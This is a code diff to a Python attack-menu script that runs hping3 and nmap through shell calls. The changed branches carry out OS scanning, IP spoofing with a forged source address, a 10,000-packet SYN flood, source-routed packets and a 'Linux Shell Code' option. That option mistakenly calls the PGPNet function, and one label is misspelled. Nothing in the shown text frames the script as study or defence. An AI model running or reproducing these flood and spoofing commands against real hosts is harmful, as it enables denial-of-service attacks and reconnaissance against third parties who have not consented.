@@ -72,7 +72,7 @@ while True:
         subprocess.call(f"nmap -p 80 -O {ip}", shell=True)
     elif attack == 10:
         print("IP Spoofing")
-        subprocess.call(f"hping3 -S {ip} -a {obf}-c 3 ", shell=True)
+        subprocess.call(f"hping3 -S {ip} -a {obf} -c 3 ", shell=True)
     elif attack == 12:
         print("DDOS: Syn Floods")
         subprocess.call(f"hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood {ip} ", shell=True)
@@ -91,24 +91,18 @@ while True:
         print("Source Routing")
         subprocess.call(f"hping3 -S -p 10 -c 5 --lsrr {obf} {ip}", shell=True)
     elif attack == 17:
-        print("Windows Messenger Pop-Up Spam")
-        subprocess.call(f"hping3 -S -p 10 -c 5 --lsrr {obf} {ip}", shell=True)
-    elif attack == 18:
-        print("ICMP Scapy")
+        print("Messneger")
         windows_messenger()
-    elif attack == 19:
+    elif attack == 18:
         print("PGPNet Connection")
         pgpnet_connection()
-    elif attack == 20:
+    elif attack == 19:
         print("Linux Shell Code")
         pgpnet_connection()      
     
-   
-
-
-        
-
-
+    
+    
+    
     else:
         print("Blyat!@#")
         
